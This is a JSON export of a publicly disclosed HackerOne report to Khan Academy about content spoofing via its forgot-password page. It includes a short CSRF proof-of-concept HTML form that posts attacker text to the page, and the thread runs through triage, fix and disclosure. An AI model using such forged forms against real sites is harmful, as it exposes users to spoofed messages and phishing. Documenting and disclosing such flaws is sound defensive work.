{"id":159213,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTkyMTM=","url":"https://hackerone.com/reports/159213","title":"The web app's forgot password page is vulnerable to text injection/content spoofing","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-14T09:16:21.307Z","submitted_at":"2016-08-14T09:16:21.307Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dermeister","url":"/dermeister","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":134,"url":"https://hackerone.com/khanacademy","handle":"khanacademy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Khan Academy","twitter_handle":"","website":"https://www.khanacademy.org/","about":"Start learning now. Completely free, forever."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-01T15:53:53.226Z","bug_reporter_agreed_on_going_public_at":"2017-03-01T10:33:36.075Z","team_member_agreed_on_going_public_at":"2017-03-01T15:53:53.157Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker will exploit this by chaining it with CSRF (there is not protection against CSRF for that page) as scenario can only be created by a POST request.\nThe attacker will target innocent users by doing this and some of them would fall in trap by calling the number or by sending the email. More about attack scenario at https://www.owasp.org/index.php/Content_Spoofing\n\nRefer the attached image as proof of concept.\n\nAlso the proof of exploiting it using CSRF is:\n\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.khanacademy.org/forgotpw\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"email\" value=\"\u003cthe malicous text will come here\u003e\" /\u003e\n      \u003cinput type=\"hidden\" name=\"reset\" value=\"Reset\u0026#32;password\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e","vulnerability_information_html":"\u003cp\u003eAn attacker will exploit this by chaining it with CSRF (there is not protection against CSRF for that page) as scenario can only be created by a POST request.\u003cbr\u003e\nThe attacker will target innocent users by doing this and some of them would fall in trap by calling the number or by sending the email. More about attack scenario at \u003ca title=\"https://www.owasp.org/index.php/Content_Spoofing\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FContent_Spoofing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/Content_Spoofing\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eRefer the attached image as proof of concept.\u003c/p\u003e\n\n\u003cp\u003eAlso the proof of exploiting it using CSRF is:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://www.khanacademy.org/forgotpw\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;\u0026lt;the malicous text will come here\u0026gt;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;reset\u0026quot; value=\u0026quot;Reset\u0026amp;#32;password\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-31T10:33:36.112Z","allow_singular_disclosure_after":-118260162.23984861,"singular_disclosure_allowed":true,"vote_count":5,"voters":["eveeez","geekninja","japz","spetr0x","rdmak"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1125667,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please find the attached image (Khan Academy 1.png)","markdown_message":"\u003cp\u003ePlease find the attached image (Khan Academy 1.png)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-14T09:18:51.448Z","updated_at":"2016-08-14T09:18:51.448Z","actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":112064,"filename":"Khan_Academy_1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/112/064/e6d02efc67f6ce47bd59dd505e03860ae3539ec0/Khan_Academy_1.png?response-content-disposition=attachment%3B%20filename%3D%22Khan_Academy_1.png%22%3B%20filename%2A%3DUTF-8%27%27Khan_Academy_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT27VLVF5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043618Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDyDghanG6vysQhpIAbM6%2FNloTNBCfelRP1BGB1eeXDqQIgbh0u2InfYPRbM%2F0t24amgCOkVvoWkVHPo82TR%2BcSzPAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDG%2B9r1w6aCtbN7N%2FgSqRA8D1stzGXUi9998X9PqljCsxgqGb%2Fp5uwkl6HJ0ecyYUUOvKKK5bmjBmyhHU2siTJ5oMPHjZxACmC8QQR3zoStgvndU2Zk5FbI60XrAqVuUH%2BAK8pT26qvrZcq89M6eB7hRHvO%2BlRluLVtVVrfnC9UY0ATKZRmiYQyw9njaWy8e1cjtpV8uOzRbjAhSciTaQQ4Rof7K88HsyWXiwgfBdP3a0%2F0Eg3oYuiHO02sK0kJaBKVYS07wec5XsHKb5ikjLS61g4AVfdD4E0s3BTqyyWJeUCuyZ2YF95UI2CgkxcN5uOwwloEhHGonUYBlgrAIqXt%2FcecQNzktOM4Kjb30muwbzt0arTqS1XHySraj31WYHm2Cjy8AzyWIgNzu3Fq1xIENb3SovWG27JzCLGUyEU3ScE8nRNwiiydbGzKllImVZY%2BlC%2Bix1yqgNQOGSyxfVhY5J1d45Od%2BL4mUjygcLy%2FfzSKLf2qk3Prr%2BvcoxR9uUbkbtYRAEtizE%2BcIlRuTm3EFnBIvoMHCuplZLf4vZOpMrMLy9qv8FOusBWsgqdyTGkJS5%2BgtM3tHipB468LJZahmRjNSAud9TlniHiRJFpE4feQDaRgu4UD5waPGdkb1Mb3i2BGePA4gRyDu2hwL2UgW1yGpknpSCsy8uyMOhlVuIUyq7t0qBeid6h%2BvKgio2%2B05MKsls9XtVWxBqwW4LqYzc6KBQa0dOAdmkMORLktM2DWUfeoN%2FP12TUiKzRe%2BPGjaA3xBRgCZ2zNYmbNzYsoqOBfPEmbGygz2YZR0LAXBWrVpPc%2FJcYMLT6Jiu%2B2LCo6XyNRnu8YlFqwJ3EhjYkRvFzarUXssQ7cQHuLkop%2BkUTr8Vig%3D%3D\u0026X-Amz-Signature=b82c169a66120220d7ee0d5203bd8e8170cf750960912fbd0ed637652c48f739"}],"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1131130,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello there,\n\nAny updates on this?\n\nThanks!","markdown_message":"\u003cp\u003eHello there,\u003c/p\u003e\n\n\u003cp\u003eAny updates on this?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T05:25:41.850Z","updated_at":"2016-08-17T05:25:41.850Z","actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1149510,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report! I've created a ticket for this in our internal tracking system, and we'll let you know when we've resolved it.","markdown_message":"\u003cp\u003eThanks for the report! I\u0026#39;ve created a ticket for this in our internal tracking system, and we\u0026#39;ll let you know when we\u0026#39;ve resolved it.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-23T16:56:56.279Z","updated_at":"2016-08-23T16:56:56.279Z","actor":{"username":"sean-ka","cleared":false,"url":"/sean-ka","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1149516,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-23T16:59:36.819Z","updated_at":"2016-08-23T16:59:36.819Z","actor":{"username":"sean-ka","cleared":false,"url":"/sean-ka","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1150651,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure....Thanks !!","markdown_message":"\u003cp\u003eSure....Thanks !!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-24T02:10:53.007Z","updated_at":"2016-08-24T02:10:53.007Z","actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1506052,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Friends,\n\nAny updates on this? It has been a long time. Its fix is easy. You just need to validate the email format and then display it back to users. And to be more secure you can also add CSRF token for that page.\n\nRegards","markdown_message":"\u003cp\u003eHi Friends,\u003c/p\u003e\n\n\u003cp\u003eAny updates on this? It has been a long time. Its fix is easy. You just need to validate the email format and then display it back to users. And to be more secure you can also add CSRF token for that page.\u003c/p\u003e\n\n\u003cp\u003eRegards\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-26T03:21:35.762Z","updated_at":"2017-02-26T03:21:35.762Z","actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1508497,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, this should now be fixed – can you confirm?\n\nIf you send me your Khan Academy account email or username I'd be happy to give you our [Friendly Hacker](https://www.khanacademy.org/badges/friendly-hacker) badge.","markdown_message":"\u003cp\u003eThanks, this should now be fixed – can you confirm?\u003c/p\u003e\n\n\u003cp\u003eIf you send me your Khan Academy account email or username I\u0026#39;d be happy to give you our \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.khanacademy.org%2Fbadges%2Ffriendly-hacker\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFriendly Hacker\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e badge.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T14:59:10.809Z","updated_at":"2017-02-27T14:59:10.809Z","actor":{"username":"jdan","cleared":false,"url":"/jdan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dermeister","url":"/dermeister"},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1508556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for that. But I already have  Friendly Hacker badge..... I have confirmed that this issue is resolved.","markdown_message":"\u003cp\u003eThanks for that. But I already have  Friendly Hacker badge..... I have confirmed that this issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T15:32:43.509Z","updated_at":"2017-02-27T15:32:43.509Z","actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1508574,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I wanna disclose it publicly. Would you mind it?","markdown_message":"\u003cp\u003eI wanna disclose it publicly. Would you mind it?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T15:38:12.650Z","updated_at":"2017-02-27T15:38:12.650Z","actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1508759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Go for it! Thanks again for all your help.","markdown_message":"\u003cp\u003eGo for it! Thanks again for all your help.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T16:44:51.382Z","updated_at":"2017-02-27T16:44:51.382Z","actor":{"username":"jdan","cleared":false,"url":"/jdan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1513097,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-01T10:33:36.095Z","updated_at":"2017-03-01T10:33:36.095Z","first_to_agree":true,"actor":{"username":"dermeister","cleared":false,"url":"/dermeister","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/065/085/b14379cd81c972748951b6dd4d78f6f1dd3987d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1513584,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-01T15:53:53.194Z","updated_at":"2017-03-01T15:53:53.194Z","actor":{"username":"jdan","cleared":false,"url":"/jdan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1513585,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-01T15:53:53.244Z","updated_at":"2017-03-01T15:53:53.244Z","actor":{"username":"jdan","cleared":false,"url":"/jdan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}